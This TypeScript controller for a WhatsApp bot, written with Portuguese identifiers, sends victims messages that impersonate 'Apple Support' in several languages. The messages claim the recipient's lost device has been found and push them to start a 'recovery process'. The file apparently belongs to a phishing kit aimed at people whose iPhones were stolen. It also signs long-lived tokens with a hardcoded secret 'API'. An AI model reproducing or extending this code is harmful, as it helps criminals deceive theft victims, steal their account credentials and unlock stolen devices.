import jwt from "jsonwebtoken";
import {
  criarConexao,
  buscarConexaoByNome,
  atualizarConexao,
} from "../services/whatsapp";
import {
  criarAtendimento,
  buscarAtendimento,
  deleteAtendimento,
} from "../services/atendimento";
import { getWbot, initWbot, removeWbot } from "../whatsapp/baileys";

export const whatsapp = async (req: any, res: any, next: any) => {
  const existe = await buscarConexaoByNome(req.body.name);
  if (existe) {
    const token = jwt.sign(
      {
        instance: existe,
      },
      "API",
      {
        expiresIn: "365d",
      }
    );

    return res.status(200).send({
      codigo: 201,
      mensagem: "Token gerado com sucesso!",
      accessToken: token,
    });
  }
  const conexao = await criarConexao(req.body);
  const io = req.app.get("socketio");
  await initWbot(conexao, io);

  const token = jwt.sign(
    {
      instance: conexao,
    },
    "API",
    {
      expiresIn: "365d",
    }
  );

  return res.status(200).send({
    codigo: 201,
    mensagem: "Token gerado com sucesso!",
    accessToken: token,
  });
};

export const enviarMensagem = async (req: any, res: any, next: any) => {
  const { instance } = req.usuario;
  const { language, number, link, picture_model, model, imei, protocolo } =
    req.body;
  const bot = getWbot(instance.id);

  const existe = await buscarAtendimento(number);

  if (existe) {
    await deleteAtendimento(existe.id);
  }

  await criarAtendimento({
    number: number,
    link: link,
    model: model,
    language: language,
    protocolo: protocolo,
    picture_model: picture_model,
  });

  await bot.sendMessage(`${number}@s.whatsapp.net`, {
    image: {
      url: picture_model,
    },
  });

  const mensagem = {
    pt: `* Suporte Oficial da Apple*\n\nApple Informa,\nPrezado(a) Cliente Apple, o seu *${model}* emitiu uma localização e foi encontrado. Saiba como realizar o seu *Processo de Recuperação.* Inicie seu atendimento com a Assistente Virtual clicando no botão *Iniciar* abaixo.\n\n*Protocolo do Atendimento:* ${protocolo}.`,
    en: `*Apple Support*\n\nApple informs you,\nDear Customer Apple, your *${model}* has been found. You can find out how to recover your device by clicking the button *Start* below.\n\n*Protocol of the Service:* ${protocolo}.`,
    es: `*Soporte Oficial de Apple*\n\nApple informa,\nPrezado(a) Cliente Apple, o seu *${model}* emitiu uma localização e foi encontrado. Saiba como realizar o seu *Proceso de Recuperación.* Inicie seu atendimento com a Asistente Virtual clicando no botão *Iniciar* abaixo.\n\n*Protocolo del Servicio:* ${protocolo}.`,
    fr: `*Support Apple*\n\nApple informe,\nPrezado(a) Cliente Apple, o seu *${model}* emitiu uma localização e foi encontrado. Saiba como realizar o seu *Processus de Récupération.* Inicie seu atendimento com a Assistante Virtual clicando no bouton *Démarrer* abaixo.\n\n*Protocole du Service:* ${protocolo}.`,
  };

  const langButton = {
    pt: "Iniciar",
    en: "Start",
    es: "Iniciar",
    fr: "Démarrer",
  };

  const buttons = [
    {
      buttonId: "start",
      buttonText: { displayText: langButton[language] },
      type: 1,
    },
  ];

  const buttonMessageN = {
    text: mensagem[language],
    buttons: buttons,
    headerType: 1,
  };

  const response = await bot.sendMessage(
    `${number}@s.whatsapp.net`,
    buttonMessageN
  );

  res.json({ message: response });
};

export const meuBots = async (req: any, res: any, next: any) => {
  const { instance } = req.usuario;
  const response = await buscarConexaoByNome(instance.name);
  res.json({ data: response });
};

export const deslogarZap = async (req: any, res: any, next: any) => {
  const { instance } = req.usuario;
  const bot = getWbot(instance.id);
  bot.logout();
  removeWbot(instance.id);

  await atualizarConexao(instance.id, {
    session: "",
    retries: 0,
  });
};

export const finalizarSessao = async (req: any, res: any, next: any) => {
  const { instance } = req.usuario;
  const bot = getWbot(instance.id);
  bot.logout();
  removeWbot(instance.id);

  await atualizarConexao(instance.id, {
    session: "",
    retries: 0,
  });
};

export const repararConexao = async (req: any, res: any, next: any) => {
  const { instance } = req.usuario;
  const bot = getWbot(instance.id);
  bot.ws.close();
  const io = req.app.get("socketio");
  await initWbot(instance, io);
};
